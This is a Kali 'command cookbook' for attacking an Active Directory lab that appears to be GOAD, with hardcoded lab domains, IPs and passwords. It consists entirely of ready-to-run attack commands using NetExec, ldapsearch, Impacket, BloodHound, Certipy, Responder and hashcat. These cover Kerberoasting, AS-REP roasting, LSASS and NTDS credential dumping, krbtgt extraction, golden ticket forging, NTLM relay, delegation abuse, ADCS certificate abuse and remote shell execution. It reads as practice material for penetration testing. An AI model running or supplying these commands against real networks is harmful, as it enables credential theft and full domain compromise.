# Command cookbook (Kali)

All examples use the default `192.168.56.0/24` prefix.

## NetExec

```bash
nxc smb 192.168.56.10-23
nxc smb 192.168.56.11 -u USER -p PASS --shares --sessions --loggedon-users
nxc smb 192.168.56.11 -u USER -H NTHASH --local-auth
nxc ldap 192.168.56.11 -u USER -p PASS --users --groups --trusted-for-delegation
nxc ldap 192.168.56.11 -u USER -p PASS --asreproast /logs/hashes/asrep.txt
nxc ldap 192.168.56.11 -u USER -p PASS --kerberoasting /logs/hashes/kerb.txt
nxc mssql 192.168.56.22 -u jon.snow -p iknownothing -d north.sevenkingdoms.local
nxc winrm 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'
nxc rdp 192.168.56.11 -u jon.snow -p iknownothing
nxc smb 192.168.56.11 -u USER -p PASS -M lsassy
nxc smb 192.168.56.11 -u USER -p PASS --ntds
```

## ldapsearch (recon — best on slow/VPN links, beats RID-brute)

```bash
# NC discovery, then bulk pulls (anonymous or guest empty password)
ldapsearch -x -H ldap://192.168.56.11 -s base namingContexts
ldapsearch -x -H ldap://192.168.56.11 -b 'DC=north,DC=sevenkingdoms,DC=local' \
  '(objectClass=user)' sAMAccountName description info userPrincipalName
# AS-REP roastable / Kerberoastable in one query each
ldapsearch -x -H ldap://192.168.56.11 -b 'DC=north,DC=sevenkingdoms,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
ldapsearch -x -H ldap://192.168.56.11 -b 'DC=north,DC=sevenkingdoms,DC=local' \
  '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
# clock / Kerberos skew check (rootDSE)
ldapsearch -x -H ldap://192.168.56.11 -s base '' currentTime
```

## Impacket

```bash
impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -dc-ip 192.168.56.11 -usersfile /logs/users.txt
impacket-GetUserSPNs north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.56.11 -request
impacket-getTGT north.sevenkingdoms.local/jon.snow:iknownothing -dc-ip 192.168.56.11
impacket-psexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
impacket-smbexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
impacket-wmiexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
impacket-secretsdump -just-dc-user krbtgt north.sevenkingdoms.local/DA:'PASS'@192.168.56.11
impacket-ntlmrelayx -t ldaps://192.168.56.11 -smb2support --delegate-access
impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
  -impersonate administrator -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/sansa.stark:345ertdfg
impacket-mssqlclient north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.22
impacket-ticketer -nthash KRBTGT -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local administrator
```

## BloodHound / Certipy / Responder

```bash
bloodhound-python -u USER -p PASS -d north.sevenkingdoms.local \
  -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11 -c All --zip
certipy find -u USER@essos.local -p PASS -dc-ip 192.168.56.12 -vulnerable -stdout
certipy req -u USER@essos.local -p PASS -ca <CA> -template <ESC> -upn administrator@essos.local
responder -I eth0 -wd
```

## Hashcat modes

| Attack | Mode | File |
| --- | --- | --- |
| AS-REP | 18200 | `$krb5asrep$23$...` |
| Kerberoast TGS-REP RC4 | 13100 | `$krb5tgs$23$...` |
| Kerberoast AES | 19700 / 19600 | `$krb5tgs$18$...` |
| NTLM | 1000 | 32-hex |
| NetNTLMv2 | 5600 | Responder / ntlmrelayx |

```bash
hashcat -m 18200 /logs/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /logs/hashes/kerb.txt /usr/share/wordlists/rockyou.txt
```
